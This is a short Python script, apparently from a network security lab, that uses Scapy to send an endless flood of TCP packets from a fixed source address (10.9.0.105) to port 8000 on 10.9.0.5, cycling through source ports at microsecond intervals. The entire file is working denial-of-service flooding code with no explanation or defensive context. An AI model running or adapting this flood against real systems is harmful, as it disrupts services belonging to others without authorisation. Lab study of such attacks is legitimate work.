from scapy.all import *


#source_IP = input("Enter IP address of Source: ")
#target_IP = input("Enter IP address of Target: ")

source_IP = "10.9.0.105"
target_IP = "10.9.0.5"
#source_port = int(input("Enter Source Port Number:"))

i = 1

while True:
    for source_port in range(1, 65535):
        IP1 = IP(src = source_IP, dst = target_IP)
        TCP1 = TCP(sport = source_port, dport = 8000)
        pkt = IP1 / TCP1
        send(pkt, inter = .000001)
        print ("packet sent ", i)
        i = i + 1
